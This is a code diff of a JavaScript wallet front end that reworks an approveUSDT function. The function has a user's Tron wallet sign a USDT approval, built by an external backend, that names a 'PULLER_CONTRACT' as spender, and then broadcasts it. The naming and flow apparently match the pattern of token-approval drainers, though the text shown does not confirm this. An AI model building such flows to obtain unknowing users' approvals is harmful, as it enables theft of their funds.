@@ -129,76 +129,76 @@ const detectSupportedTronMethods = async () => {
   return supported;
 };
 
-  const approveUSDT = async () => {
+ const approveUSDT = async () => {
     try {
-      setStatus("Creating approval transaction...");
-      setTxHash('');
-      
-      const txResponse = await fetch('https://smartcontbackend.onrender.com/create-approve', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          from: address,
-          token: USDT_CONTRACT,
-          spender: PULLER_CONTRACT,
-          amount: AMOUNT
-        })
-      });
-      console.log("approveUSDT params:", {
-  address,
-  USDT_CONTRACT,
-  PULLER_CONTRACT,
-  AMOUNT
-});
+        setStatus("Creating approval transaction...");
+        setTxHash('');
+        
+        const txResponse = await fetch('https://smartcontbackend.onrender.com/create-approve', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                from: address,
+                token: USDT_CONTRACT,
+                spender: PULLER_CONTRACT,
+                amount: AMOUNT
+            })
+        });
 
-      console.log(txResponse);
-      const unsignedTx = await txResponse.json();
-      if (!unsignedTx) throw new Error("Failed to get unsigned transaction");
-      console.log(unsignedTx);
-      setStatus("Waiting for approval signature...");
-      const signedTx = await signClient.request({
-        chainId: MAINNET_CHAIN_ID,
-        topic: session.topic,
-        request: {
-          method: 'tron_signTransaction',
-          params: [unsignedTx]
+        const unsignedTx = await txResponse.json();
+        if (!unsignedTx) throw new Error("Failed to get unsigned transaction");
+
+        setStatus("Waiting for approval signature...");
+        const signedTx = await signClient.request({
+            chainId: MAINNET_CHAIN_ID,
+            topic: session.topic,
+            request: {
+                method: 'tron_signTransaction',
+                params: [{
+                    ...unsignedTx,
+                    // Ensure permission_id is not set here - let wallet decide
+                }]
+            }
+        });
+
+        // Handle the signed transaction properly
+        let finalSignedTx;
+        if (typeof signedTx === 'string') {
+            // If wallet returns just the signature
+            finalSignedTx = { 
+                ...unsignedTx, 
+                signature: [signedTx.replace(/^0x/, '')] 
+            };
+        } else {
+            // If wallet returns full signed transaction
+            finalSignedTx = signedTx;
         }
-      });
-      let finalSignedTx;
-       console.log('broadcast near',signedTx);
-          finalSignedTx = { 
-            ...unsignedTx, 
-            signature: [signedTx.signature.replace(/^0x/, '')] 
-          };
 
-      console.log('broadcast near',signedTx);
-      console.log('broadcast near2nd',finalSignedTx);
-      
-      setStatus("Broadcasting approval transaction...");
-      const broadcastResponse = await fetch('https://smartcontbackend.onrender.com/broadcast', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({signedTx: finalSignedTx })
-      });
-      console.log('broadcast near',broadcastResponse);
-      const result = await broadcastResponse.json();
-      if (!result || !(result.txid || result.txId)) {
-        throw new Error("Broadcast failed");
-      }
+        setStatus("Broadcasting approval transaction...");
+        const broadcastResponse = await fetch('https://smartcontbackend.onrender.com/broadcast', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ signedTx: finalSignedTx })
+        });
 
-      const txId = result.txid || result.txId;
-      setTxHash(txId);
-      setStatus(`✅ Approval sent! TXID: ${txId}`);
+        const result = await broadcastResponse.json();
+        if (!result || !(result.txid || result.txId)) {
+            throw new Error("Broadcast failed");
+        }
 
-      setTimeout(() => {
-        window.open(`https://tronscan.org/#/transaction/${txId}`, '_blank');
-      }, 1000);
+        const txId = result.txid || result.txId;
+        setTxHash(txId);
+        setStatus(`✅ Approval sent! TXID: ${txId}`);
+
+        setTimeout(() => {
+            window.open(`https://tronscan.org/#/transaction/${txId}`, '_blank');
+        }, 1000);
 
     } catch (error) {
-      console.error("Approval error:", error);
-      setStatus(`❌ Error: ${error.message}`);
+        console.error("Approval error:", error);
+        setStatus(`❌ Error: ${error.message}`);
     }
-  };
+};
 
   const sendUSDT = async () => {
     try {
